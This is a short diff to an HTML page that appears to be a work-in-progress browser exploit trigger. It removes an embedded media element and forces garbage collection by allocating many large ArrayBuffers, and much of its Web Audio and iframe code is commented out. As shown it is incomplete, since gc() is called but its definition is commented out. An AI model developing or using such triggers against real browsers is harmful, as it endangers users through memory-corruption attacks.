@@ -24,6 +24,36 @@ index.html
 </body> -->
 
 <body>
-    exploit.html
+<!-- <iframe id="frame" src="127.0.0.1/tmp.html"></iframe> -->
+<button onclick="removeChild()">Click me</button>
 <embed id="worker" src="data:video/mp4;"></embed>
+<script>
+// let audioContext;
+// let analyserNode;
+
+// function gc() {
+//     for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
+// }
+// function trigger() {
+//     document.getElementById("frame").src = "https://google.com";
+//     gc();
+// }
+// function query() {
+    
+//     analyserNode.evil_func(analyserNode);
+// }
+function removeChild() {
+    var elem = document.getElementById("worker");
+    elem.parentNode.removeChild(elem);
+    gc();
+}
+
+// try {
+//     audioContext = new AudioContext();
+// } catch(e) {
+//     alert('Web Audio API is not supported in this browser');
+// }
+// analyserNode = audioContext.createAnalyser();
+
+</script>
 </body>
